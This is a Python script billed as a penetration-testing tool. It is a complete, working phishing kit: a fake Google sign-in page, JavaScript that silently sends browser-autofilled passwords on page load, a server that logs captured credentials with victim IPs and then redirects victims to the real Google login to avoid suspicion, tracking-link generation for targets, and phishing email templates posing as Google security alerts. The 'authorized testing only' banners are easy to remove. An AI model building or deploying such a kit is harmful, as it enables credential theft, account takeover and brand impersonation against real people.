#!/usr/bin/env python3
"""
Email Credential Harvester via Malicious Link
FOR AUTHORIZED PENETRATION TESTING ONLY
Educational tool for understanding credential theft vectors
"""
import random
import http.server
import socketserver
import urllib.parse
import json
import base64
from datetime import datetime

PORT = 8080

# HTML page that auto-captures saved credentials from browser
HARVESTER_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>Sign in - Google Accounts</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', Arial, sans-serif; }
        body { background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 450px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; }
        .logo { text-align: center; margin-bottom: 24px; }
        .logo img { height: 32px; }
        h1 { color: #202124; font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 8px; }
        p.subtitle { color: #5f6368; font-size: 16px; text-align: center; margin-bottom: 32px; }
        
        .input-group { position: relative; margin-bottom: 24px; }
        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; }
        input:focus { border-color: #1a73e8; border-width: 2px; padding: 12px 14px; }
        
        .warning { 
            background: #ffeb3b; 
            color: #000; 
            padding: 12px; 
            text-align: center; 
            margin-bottom: 20px; 
            border-radius: 4px;
            font-weight: bold;
            font-size: 14px;
        }
        
        .btn { 
            width: 100%; 
            padding: 12px; 
            background: #1a73e8; 
            color: white; 
            border: none; 
            border-radius: 4px; 
            font-size: 16px; 
            font-weight: 500;
            cursor: pointer;
        }
        .btn:hover { background: #1557b0; }
        
        .links { margin-top: 32px; font-size: 14px; color: #5f6368; }
        .links a { color: #1a73e8; text-decoration: none; font-weight: 500; }
        
        .footer { margin-top: 32px; display: flex; justify-content: space-between; font-size: 12px; color: #5f6368; }
        .footer a { color: #757575; text-decoration: none; margin-left: 24px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="warning">⚠️ SECURITY TEST - DO NOT ENTER REAL CREDENTIALS</div>
        
        <div class="logo">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
        </div>
        
        <h1>Sign in</h1>
        <p class="subtitle">to continue to Gmail</p>
        
        <form id="harvestForm" action="/capture" method="POST">
            <div class="input-group">
                <input type="email" id="email" name="email" placeholder="Email or phone" required autocomplete="username">
            </div>
            
            <div class="input-group">
                <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="current-password">
            </div>
            
            <div style="text-align: left; margin-bottom: 24px;">
                <a href="#" style="color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none;">Forgot password?</a>
            </div>
            
            <div style="display: flex; justify-content: space-between; align-items: center;">
                <a href="#" style="color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none;">Create account</a>
                <button type="submit" class="btn">Next</button>
            </div>
        </form>
        
        <div class="links">
            <p>Not your computer? Use Guest mode to sign in privately.</p>
            <a href="#">Learn more</a>
        </div>
        
        <div class="footer">
            <div>English (United States)</div>
            <div>
                <a href="#">Help</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
            </div>
        </div>
    </div>

    <script>
        // Auto-capture browser-saved credentials if auto-filled
        document.addEventListener('DOMContentLoaded', function() {
            // Wait for browser auto-fill
            setTimeout(function() {
                var email = document.getElementById('email').value;
                var password = document.getElementById('password').value;
                
                // If browser auto-filled, send immediately
                if (email && password) {
                    fetch('/auto-capture', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            email: email,
                            password: password,
                            source: 'browser_autofill',
                            timestamp: new Date().toISOString(),
                            userAgent: navigator.userAgent,
                            platform: navigator.platform
                        })
                    });
                }
            }, 1000);
        });
        
        // Capture on form submit
        document.getElementById('harvestForm').addEventListener('submit', function(e) {
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;
            
            // Send to attacker server
            fetch('/capture', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password)
            });
        });
    </script>
</body>
</html>
'''

class CredentialHarvester(http.server.BaseHTTPRequestHandler):
    captured_creds = []
    
    def do_GET(self):
        """Serve the phishing page"""
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(HARVESTER_HTML.encode())
            
        elif self.path.startswith('/link'):
            # Track click from email/sms link
            params = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
            tracking_id = params.get('id', ['unknown'])[0]
            
            print(f"\n[+] Link clicked! Tracking ID: {tracking_id}")
            print(f"    IP: {self.client_address[0]}")
            print(f"    Time: {datetime.now()}")
            
            # Redirect to phishing page
            self.send_response(302)
            self.send_header('Location', '/')
            self.end_headers()
            
        else:
            self.send_error(404)
    
    def do_POST(self):
        """Capture submitted credentials"""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode()
        
        if self.path == '/capture':
            # Form submission
            params = urllib.parse.parse_qs(post_data)
            
            creds = {
                'timestamp': datetime.now().isoformat(),
                'ip': self.client_address[0],
                'email': params.get('email', [''])[0],
                'password': params.get('password', [''])[0],
                'user_agent': self.headers.get('User-Agent', 'Unknown'),
                'referer': self.headers.get('Referer', 'Direct'),
                'source': 'form_submit'
            }
            
            self.save_credentials(creds)
            
            # Redirect to real Google login (prevents suspicion)
            self.send_response(302)
            self.send_header('Location', 'https://accounts.google.com/signin')
            self.end_headers()
            
        elif self.path == '/auto-capture':
            # Auto-fill capture via JavaScript
            data = json.loads(post_data)
            data['ip'] = self.client_address[0]
            data['user_agent'] = self.headers.get('User-Agent', 'Unknown')
            
            self.save_credentials(data)
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'ok'}).encode())
    
    def save_credentials(self, creds):
        """Save and display captured credentials"""
        self.captured_creds.append(creds)
        
        print(f"\n{'='*60}")
        print(f"🔴 CREDENTIALS CAPTURED!")
        print(f"{'='*60}")
        print(f"📧 Email: {creds.get('email')}")
        print(f"🔑 Password: {creds.get('password')}")
        print(f"🌐 IP: {creds.get('ip')}")
        print(f"⏰ Time: {creds.get('timestamp')}")
        print(f"📱 Source: {creds.get('source', 'unknown')}")
        print(f"{'='*60}")
        
        # Save to file
        with open('captured_credentials.json', 'a') as f:
            f.write(json.dumps(creds) + '\n')
    
    def log_message(self, format, *args):
        pass

# Link generator for distribution
def generate_tracking_link(base_url: str, target_email: str, campaign: str = "test"):
    """
    Generate tracked malicious link
    """
    tracking_id = base64.b64encode(f"{target_email}:{campaign}".encode()).decode()
    link = f"{base_url}/link?id={tracking_id}"
    
    print(f"\n[+] Generated tracking link:")
    print(f"    Target: {target_email}")
    print(f"    Campaign: {campaign}")
    print(f"    Link: {link}")
    
    # Shortened/obfuscated version
    short_link = f"{base_url}/?{random.randint(1000,9999)}"
    print(f"    Short: {short_link}")
    
    return link

# Email template with malicious link
def create_email_template(malicious_link: str, target_name: str = "User"):
    """
    Create convincing phishing email
    """
    templates = {
        "google": {
            "subject": "Security Alert: Unusual sign-in activity detected",
            "body": f"""
            <html>
            <body style="font-family: Arial, sans-serif; max-width: 600px;">
                <div style="border: 1px solid #dadce0; border-radius: 8px; padding: 24px;">
                    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" 
                         style="height: 32px; margin-bottom: 24px;">
                    
                    <h2 style="color: #202124; font-size: 20px;">Unusual sign-in activity</h2>
                    
                    <p>Hi {target_name},</p>
                    
                    <p>We noticed a sign-in to your Google Account from a new device:</p>
                    
                    <div style="background: #f8f9fa; padding: 16px; border-radius: 4px; margin: 16px 0;">
                        <p><strong>When:</strong> {datetime.now().strftime('%A, %B %d, %Y')}</p>
                        <p><strong>Where:</strong> Unknown location</p>
                        <p><strong>Device:</strong> Unknown device</p>
                    </div>
                    
                    <p>If this was you, you can safely disregard this email. If not, secure your account now:</p>
                    
                    <div style="text-align: center; margin: 24px 0;">
                        <a href="{malicious_link}" 
                           style="background: #1a73e8; color: white; padding: 12px 32px; 
                                  text-decoration: none; border-radius: 4px; display: inline-block;
                                  font-weight: 500;">
                            Review Activity
                        </a>
                    </div>
                    
                    <p style="color: #5f6368; font-size: 14px;">
                        You received this email to let you know about important changes to your Google Account.
                    </p>
                </div>
                
                <div style="text-align: center; margin-top: 24px; font-size: 12px; color: #5f6368;">
                    <p>© 2024 Google LLC, 1600 Amphitheatre Parkway, Mountain View, CA 94043, USA</p>
                </div>
                
                <div style="background: #ffeb3b; padding: 12px; text-align: center; margin-top: 20px; font-weight: bold;">
                    ⚠️ SECURITY TEST - DO NOT CLICK IF NOT AUTHORIZED
                </div>
            </body>
            </html>
            """
        },
        
        "password_reset": {
            "subject": "Password reset requested",
            "body": f"""
            <html>
            <body style="font-family: Arial, sans-serif;">
                <h2>Password Reset</h2>
                <p>Someone requested a password reset for your account.</p>
                <p>If this was you, click below to reset:</p>
                <a href="{malicious_link}" style="background: #007bff; color: white; padding: 12px 24px; 
                       text-decoration: none; border-radius: 4px;">Reset Password</a>
                <p>Link expires in 24 hours.</p>
            </body>
            </html>
            """
        }
    }
    
    return templates

def run_server():
    """Start credential harvester server"""
    print(f"""
    ╔══════════════════════════════════════════════════════════╗
    ║     EMAIL CREDENTIAL HARVESTER                          ║
    ║     FOR AUTHORIZED PENETRATION TESTING ONLY              ║
    ╚══════════════════════════════════════════════════════════╝
    
    Server starting on port {PORT}...
    
    Usage:
    1. Server will capture credentials when victims submit forms
    2. Use generate_tracking_link() to create tracked links
    3. Send links via email/SMS to targets (with authorization!)
    4. Captured credentials saved to captured_credentials.json
    
    WARNING: Unauthorized use violates computer fraud laws!
    """)
    
    with socketserver.TCPServer(("", PORT), CredentialHarvester) as httpd:
        print(f"\n[+] Server running at http://localhost:{PORT}")
        print("[+] Waiting for victims to click links...\n")
        httpd.serve_forever()

if __name__ == "__main__":
    # Generate example tracking link
    base = f"http://localhost:{PORT}"
    test_link = generate_tracking_link(base, "victim@example.com", "campaign_1")
    
    # Show email templates
    templates = create_email_template(test_link, "John Doe")
    print(f"\n[+] Email template ready:")
    print(f"    Subject: {templates['google']['subject']}")
    
    # Start server
    run_server()